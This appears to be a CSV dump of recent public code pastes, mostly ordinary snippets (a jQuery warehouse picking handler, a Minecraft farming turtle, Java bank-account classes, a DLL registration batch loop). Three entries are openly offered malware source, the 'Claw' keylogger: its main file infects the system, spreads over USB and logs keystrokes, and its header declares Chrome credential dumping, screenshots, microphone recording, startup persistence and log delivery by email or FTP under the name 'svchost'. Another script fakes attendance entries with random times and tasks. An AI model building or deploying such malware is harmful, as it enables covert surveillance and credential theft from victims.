id,title,username,language,date,content
G7sXK9xY,Send data after enter,Syehaji93,JavaScript,Monday 28th of August 2023 12:15:08 AM CDT,"var key = e.which;
    var jml_char_qty = $('#qty_part').val().length;
    var part_code = $('#part_code').val();
    var qty_part = $('#qty_part').val();
    var pl_unix = $('#pl_unix').val();
    
    if(key == 13)
    {
        var Toast = Swal.mixin({
            toast: true,
            position: 'top-end',
            showConfirmButton: false,
            timer: 7000
        });

        if(qty_part != """")
        {
            $.ajax({
                type: ""post"",
                url: ""<?= site_url('picking/additional') ?>"",
                data: {
                    pl_unix : pl_unix,
                    part_code: part_code,
                    qty_part: qty_part
                },
                dataType: ""json"",
                success: function(response){
                    var Toast = Swal.mixin({
                        toast: true,
                        position: 'top-end',
                        showConfirmButton: false,
                        timer: 7000
                    });

                    if(response.respon === 1)
                    {
                        // console.log(response.data);
                        // console.log(response.d);
                        // console.log(response.res.tampil_detail);
                        // alert('Part Code' + ' ' + response.data);
                        // $('.view_data').html(response.res);
                        $('#part_code').val('');
                        $('#qty_part').val('');
                        $('#part_code').focus();
                        // $('#additional').removeClass('show');

                        $(""#table_picking tbody"").empty();
                        $(""#res_div"").empty();
                        $(""#after_check"").empty();
                        $(""#before_check"").empty();
                        $(""#after_check"").html(response.res.after_scan);
                        $(""#before_check"").html(response.res.before_scan);
                        if(response.res.result == 'Open')
                        {
                            $('#res_div').append('<label for=""result"">Result : </label>&nbsp;<span class=""description-text badge badge-danger"" id=""results"">'+response.res.result+'</span>')
                        }else if(response.res.result == ""Close""){
                            $('#res_div').append('<label for=""result"">Result : </label>&nbsp;<span class=""description-text badge badge-success"" id=""results"">'+response.res.result+'</span>')
                        }

                        var r = '';
                        var tr = '';
                        $.each(response.res.tampil_detail, function(i, item) {
                            if(item.dt_result == ""Open"")
                            {
                            r = '<span class=""badge badge-danger"">'+ item.dt_result +'</span>';
                            }else if(item.dt_result == ""Close""){
                            r = '<span class=""badge badge-success"">'+ item.dt_result +'</span>';
                            }

                            tr += '<tr align=""center""><td>'+ item.dt_part_code +
                                '</td><td>' + item.dt_part_name +
                                '</td><td>' + item.dt_part_wh_code +
                                '</td><td>' + item.dt_lot_qty +
                                '</td><td>' + item.dt_qty_pcs +
                                '</td><td>' + item.dt_qty_reel +
                                '</td><td>' + item.dt_tot_scan +
                                '</td><td>' + item.dt_has_scan +
                                '</td><td>' + r +
                                '</td></tr>';
                        });
                        $('#table_picking tbody').html(tr);

                        // console.log(wrap('<p>').html(tr));

                        $('#part_code').val(null);
                        $('#qty_part').val(null);
                        //refresh dashboard
                        b_picking();
                        b_penerimaan();
                        f_picking();

                        Toast.fire({
                            icon: 'success',
                            title: 'Success',
                            text: response.data
                        });
                        console.log('ok');
                    }else if(response.respon === 0){
                        $('#part_code').val(null);
                        Toast.fire({
                            icon: 'error',
                            title: 'Error',
                            text: response.data
                        });
                    }
                },
                error: function(xhr, ajaxOptions, thrownError) {
                    alert(xhr.status + ""\n"" + xhr.responseText + ""\n"" + thrownError);
                }
            });
            // e.preventDefault();
        }else{
            Toast.fire({
                icon: 'error',
                title: 'Error',
                text: 'Qty part tidak boleh kosong'
            });
        }
    }
});						"
aAUmvdSn,RowFarmer,BananaSplit40404,Lua,Sunday 27th of August 2023 11:42:32 PM CDT,"local counter = 0

function cleanInventory()
    for i = 1, 16 do
        turtle.select(i)
        turtle.dropDown()
    end
    turtle.select(1)
end

while true do
    
    turtle.forward()
    local success, data = turtle.inspectDown()
    if success then 
        if data.name == 'minecraft:potatoes' and data.state.age == 7 then
            turtle.digDown()
            turtle.placeDown()
        end
    else 
        turtle.turnLeft()
        turtle.turnLeft()
        counter = counter + 1
        if counter ~= 0 and counter % 2 == 0 then
            cleanInventory()
            os.sleep(900)
        end
    end
end"
64dXuYX2,src/makefile,FlyFar,Make,Sunday 27th of August 2023 10:53:40 PM CDT,"main:
	g++ main.cpp claw.cpp -o claw.exe -lgdiplus -lwininet -mwindows -lwinmm -m32 -O3 -Os -static
stripped:
	g++ main.cpp claw.cpp -o claw.exe -lgdiplus -lwininet -mwindows -lwinmm -m32 -O3 -MD -s -Os -static"
fmV7qmSb,src/main.cpp,FlyFar,C++,Sunday 27th of August 2023 10:53:05 PM CDT,"#include ""Claw.h""

int main
()
{
    Claw crs;
    crs.GetKeyLoggerInformation(); // Load information
    crs._infect(); // Infect the system
    SetCurrentDirectory((LPSTR)crs.HQ.c_str()); // Set working directory to Install location
    
    HANDLE ht = CreateThread( NULL, 0, USBINFECT,NULL, 0, NULL);  // Create Usb Infection thread
    if (ht == NULL)
    {
        exit(1);
    }

    HANDLE hThread = CreateThread( NULL, 0, NOTIFIER, NULL, 0, NULL); // Create Log Notifier thread
    if (hThread == NULL)
    {
        exit(1);
    } 
    // Start Keylogging
    while(true)
    {
        Sleep(10);
        crs.Keylogger();
    }
   
    return 0;
}"
QQ2khW7W,src/claw.h,FlyFar,C++,Sunday 27th of August 2023 10:52:29 PM CDT,"/*

Author: Fahad (QuantumCore)

https://github.com/quantumcore
https://quantumcored.com

claw.h (c) 2020

CLAW KEYLOGGER
*/

//====================
#ifndef Claw_C
#define Claw_C

#include <algorithm>
#include <string>
#include <sstream>
#include <fstream>
#include <windows.h>
#include <limits>
#include <tchar.h>
#include <TlHelp32.h>
#include <shlobj.h>
#include <ctime>
#include <gdiplus.h>
#include <wininet.h>
//====================

#define UNLEN 256

//====================
// Threads
DWORD WINAPI NOTIFIER(LPVOID lpParameter);
DWORD WINAPI USBINFECT(LPVOID lpParameter);
//====================

class Claw {
	public:

	std::string DELIVERY_USER = """"; // the Delivery Username / Email
	std::string DELIVERY_PASS = """"; // the Delivery Password
	std::string FTP_SERVER = """"; // FTP Server (if used)
	std::string INSTALL_NAME = """"; // The name to infect the pc as
	std::string strTimeInterval = """"; // Time interval to send logs
	std::string DELIVERY_METHOD = """"; // Delivery method, ftp or smtp
	std::string MIC_OPTION = """"; // To Record Mic or not
	std::string HQ = """"; // HQ is the Install location
	std::string SCREENSHOTFILENAME; // 1st Screenshot filename 
	std::string SECONDSCREENSHOT; // 2nd Screenshot filename
	std::string MICFILENAME; // Mic Recording filename

	unsigned int TIME_INTERVAL = 0; // The time interval string, On line 39, is later converted to unsigned int, Stored here.
	WIN32_FIND_DATA data; 

	std::string random_string( size_t length ); // returns random string 
	//============================
	std::string initial_install_directory(); // Returns Initial Install directory
	//============================
	void copyFile(const char* source, const char* dest); // Copy file
	//============================
	void _infect(); // Infect the system
	//============================
	void StartupKey(const char* czExePath); // Add to Startup
	//============================   
	std::string Dir(); // Get Current Directory
	//============================
	void replaceAll( std::string &s, const std::string &search, const std::string &replace ); // This function is used 
	// To replace all instances of a string in an another string.
	//============================
	bool SendMail(std::string message, std::string subject); // Send Email
	//============================
	void split(char* src, char* dest[5],  const char* delimeter) ; // Split string, C style.
	//============================
	void ProcessDelivery(); // Log Delivery Processing
	//============================
	std::string MyLocation(); // Returns Location of Claw Keylogger
	//============================
	std::istream& ignoreline(std::ifstream& in, std::ifstream::pos_type& pos); // ignores a line being read from a file.
	//============================
	std::string getLastLine(std::ifstream& in); // Gets the Last line of the file
	//============================


	/*
	Gets Keylogger Reqiured INFORMATION. 

	Information is written in the EXE at the End of File. 
	This function, Reads the last line and loads the information required. 
	Claw cannot run without it. 
	Information format : (protocol)[](server/email)[](password)[](install_name)[](time_interval)[](mic_option) 
	Example : 

	smtp[]mygmail@gmail.com[]mygmailpassword[]svchost[]300000[]1  
		|- Sends Logs to Email on mygmail@gmail.com. Infects the PC with name 'svchost'.
		|- Sends Logs every 5 Minutes, With Mic Recording.

	ftp[]myserver.com,username[]myftpserverpass[]svchost[]300000[]0
		|- Sends Logs to FTP on myserver.com. Infects the PC with name 'svchost'.
		|- Sends Logs every 5 Minutes, Without Mic Recording.
		|- see claw.cpp line 399 for details on ftp innformaton parsing

	This information is split into an array using '[]' as it's delimeter.
	Delimeter can be changed, It should be something that must not be in any other setting as it will be split too. 
	The current delimeter is recommended to not be changed. 

	Time Intervals that Claw uses are 300000ms (5 minutes), 600000ms (10 minutes), and 900000 (15 minutes) 
	
	*/
	std::string GetKeyLoggerInformation(); 
	//============================
	DWORD ProcessId(LPCTSTR ProcessName); // GET PID of a Process by Name
	//============================
	BOOL isFile(const char* file); // Check if a file exists, Returns TRUE if it does, FALSE if it does not.
	//============================
	std::string readFileContents(const char* file); // Returns the contents of a file.
	//============================
	std::string ExecuteOutFile(const char* command, const char* output_filename); // Execute a PS Command and Redirect output to file.
	//============================
	void ExecuteSilent(const char* command); // Execute a PS Command Silently
	//============================
	void ExecuteCommandPrompt(const char* command); // Execute a Command in CMD.
	//============================
	std::string DumpChromeCredentials(); // Dump Google Chrome Credentials
	//============================
	void DumpBrowserHistory(); // Dump Browser history
	//============================
	bool hookShift(); // Get shift status
	//============================
	bool capsLock(); // Get capslock status
	//============================
	int filter(int key); // Filters keys
	//============================
	void Keylogger(); // The Keylogger
	//============================
	std::string KeylogFileName(); // returns Keylogger filename
	//===========================
	std::string WindowStamp(); // returns Window Name + Timestamp
	//===========================
	void ScreenShot(std::string JPEG_FILENAME); // Takes Screenshot of the Entire Screen.
	//===========================
	std::string WANIP(); // Returns WAN IP Address
	//===========================
	std::string UserPC(); // Returns User / PC.
	//===========================
	void RecordMic(); // Records Mic.
};



#endif // ! Claw"
4d84hcpZ,FFXI DLL Registration Batch,atom0s,Batch,Sunday 27th of August 2023 09:08:14 PM CDT,"cd /d ""D:\Games\SquareEnix\""
FOR /R %%G IN (*.dll) DO regsvr32 /s ""%%G"""
GUmhp4R6,Mad,Unknown_No_1,PHP,Sunday 27th of August 2023 08:50:57 PM CDT,PubgLiteUpdate26
A6zT968w,Binus Enrichment Auto Attend,zuramai,JavaScript,Sunday 27th of August 2023 08:39:25 PM CDT,"const entry = () => {
    
    let btn = document.querySelectorAll('.detailsbtn')[i]
    const random = (arr) => arr[Math.floor(Math.random() * (arr.length - 1))]
    
    btn.click()
    let mins = Math.floor(Math.random() * 60).toString().padStart(2, '0')

    setTimeout(() => {
            
        document.querySelector('#editClockIn').value = `09:${mins} am`
        document.querySelector('#editClockOut').value = `17:${mins} pm`
        let task = random([""Mengerjakan modul backend"", ""Mengerjakan modul frontend"", ""Testing app"", ""Membuat theme wordpress"", ""Membuat game menggunakan HTML5 canvas"", ""Melanjutkan app backend"", ""Deployment""])
        document.querySelector('#editActivity').value = task;
        document.querySelector('#editDescription').value = task;
        editSaveClick()
    }, 200)

    i++
}"
qVvNWAMV,PC-tp1cuentasueldo,LEANDRONIEVA,Java,Sunday 27th of August 2023 08:28:51 PM CDT,"public class CuentaSueldo extends Cuenta implements IOperacionesComunes{

	private final static double tope = 15000;

	private int legajo;
	private String institución;
	private String beneficios;
	private long cbu;
	
	public CuentaSueldo() {
	}

	public CuentaSueldo(long cbu) {
		
		this.cbu = cbu;
	}
	
	public void setLegajo(int nro) {
		this.legajo = nro;
	}

	public void setInstitucion(String entrada) {
		this.institución = entrada;
	}
	
	public void setBeneficios(String entrada) {
		this.beneficios = entrada;
	}

	@Override
	public void retirar(double cantidad) {
		if(cantidad>this.saldo) {
			System.out.println(""Su saldo es insuficiente"");
		}else {
			if(cantidad>tope) {
				System.out.println(""El tope de extracción es $""+tope);
			}else{
				this.saldo -= cantidad;
				System.out.println(""Se retiró $""+cantidad);
			}
		}
	}

	@Override
	public String toString() {
		return ""CuentaSueldo [Nro="" + Nro + "", Dni="" + Dni + "", saldo="" + saldo + "", interes="" + interes +"", legajo="" + legajo + "", institución="" + institución + "", beneficios="" + beneficios
				+ "", cbu="" + cbu + ""]"";
	}

	public void transferir(double monto, long cbu){
		if(this.saldo>=monto) {
			this.saldo -= monto;
			System.out.println(""Tranferencia de $""+monto+"" exitosa"");
		}else {
			System.out.println(""Fondos insuficientes"");
		}
	}
	
	public void transferir(double cantidad, String alias){
		if(this.saldo>=cantidad) {
			this.saldo -= cantidad;
			System.out.println(""Tranferencia de $""+cantidad+"" exitosa"");
		}else {
			System.out.println(""Fondos insuficientes"");
		}
	}

	@Override
	public void addBeneficios(String beneficio) {
		// TODO Auto-generated method stub
		this.beneficios += "" ""+beneficio;
		
	}

	@Override
	public void modificarCBU(long nuevo) {
		// TODO Auto-generated method stub
		this.cbu = nuevo;
	}
}
"
y41j8Lcf,PC-clasecuentatp1,LEANDRONIEVA,Java,Sunday 27th of August 2023 08:24:59 PM CDT,"public class Cuenta {
	private static long aux = 100001;
	protected long Nro = aux;
	protected long Dni;
	protected double saldo;
	protected double interes;

	public Cuenta() {
		super();
		aux++;
	}

	public Cuenta(long dni, double saldo, double interes) {
		super();
		Dni = dni;
		this.saldo = saldo;
		this.interes = interes;
		aux++;
	}
	
	public long getDni() {
		return Dni;
	}

	public void setDni(long dni) {
		Dni = dni;
	}

	public double getSaldo() {
		return saldo;
	}

	public void setSaldo(double saldo) {
		this.saldo = saldo;
	}

	public double getInteres() {
		return interes;
	}

	public void setInteres(double interes) {
		this.interes = interes;
	}

	public void actualizarSaldo() {
		this.saldo += (this.interes/365);
	}
	
	public void ingresar(double cantidad) {
		this.saldo+= cantidad;
		System.out.println(""Se ingresó $""+cantidad);
	}
	
	public void retirar(double cantidad) {
		if(cantidad>this.saldo) {
			System.out.println(""Su saldo es insuficiente"");
		}else {
			this.saldo -= cantidad;
			System.out.println(""Se retiró $""+cantidad);
		}
	}

	@Override
	public String toString() {
		return ""Cuenta [Nro="" + Nro + "", Dni="" + Dni + "", saldo="" + saldo + "", interes="" + interes + ""]"";
	}	
}
"
